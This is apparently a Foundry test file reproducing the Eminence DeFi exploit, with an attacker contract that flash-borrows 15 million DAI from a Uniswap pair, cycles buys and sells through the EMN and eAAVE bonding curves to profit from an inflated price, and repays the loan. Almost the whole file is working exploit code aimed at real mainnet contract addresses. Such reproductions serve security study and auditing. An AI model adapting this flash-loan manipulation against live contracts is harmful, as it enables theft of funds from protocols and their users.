// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost: ~$15M
// Attack TX: https://etherscan.io/tx/0x3503253131644dd9f52802d071de74e456570374d586ddd640159cf6fb9b8ad8
// @Info - The secondary bonding curve accepted an inflated EMN price.

interface IBondingCurve is IERC20 {
    function buy(
        uint256 amount,
        uint256 minReturn
    ) external returns (uint256);
    function sell(
        uint256 amount,
        uint256 minReturn
    ) external returns (uint256);
}

contract EminenceExploitTest is Test {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", 10_954_410);
    }

    function testExploit() public {
        EminenceAttacker attacker = new EminenceAttacker();
        uint256 balanceBefore = DAI.balanceOf(address(attacker));

        attacker.attack();

        assertGt(DAI.balanceOf(address(attacker)), balanceBefore, "attacker did not profit");
    }
}

contract EminenceAttacker {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IBondingCurve private constant EMN = IBondingCurve(0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8);
    IBondingCurve private constant EAAVE = IBondingCurve(0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198);
    IUniswapV2Pair private constant DAI_WETH_PAIR = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);

    uint256 private constant FLASH_AMOUNT = 15_000_000 ether;

    function attack() external {
        DAI_WETH_PAIR.swap(FLASH_AMOUNT, 0, address(this), hex"01");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(DAI_WETH_PAIR), "not pair");
        DAI.approve(address(EMN), type(uint256).max);
        EMN.approve(address(EAAVE), type(uint256).max);

        for (uint256 i; i < 3; ++i) {
            EMN.buy(DAI.balanceOf(address(this)), 0);
            EAAVE.buy(EMN.balanceOf(address(this)) / 2, 0);
            EMN.sell(EMN.balanceOf(address(this)), 0);
            EAAVE.sell(EAAVE.balanceOf(address(this)), 0);
            EMN.sell(EMN.balanceOf(address(this)), 0);
        }

        DAI.transfer(address(DAI_WETH_PAIR), (FLASH_AMOUNT * 1000) / 997 + 1);
    }
}
